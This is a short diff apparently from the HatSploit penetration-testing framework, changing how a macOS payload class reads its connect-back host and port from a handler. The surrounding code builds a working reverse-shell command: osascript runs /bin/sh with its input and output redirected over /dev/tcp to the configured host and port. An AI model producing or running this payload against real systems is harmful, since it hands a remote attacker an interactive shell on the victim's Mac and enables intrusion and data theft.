@@ -24,7 +24,8 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        connback_host, connback_port = self.parse_options(self.options)
+        connback_host = self.handler['CBHOST']
+        connback_port = self.handler['CBPORT']
 
         payload = f"osascript -e 'do shell script \"/bin/sh &>/dev/tcp/{connback_host}/{connback_port} 0>&1 &\"'"
         return payload
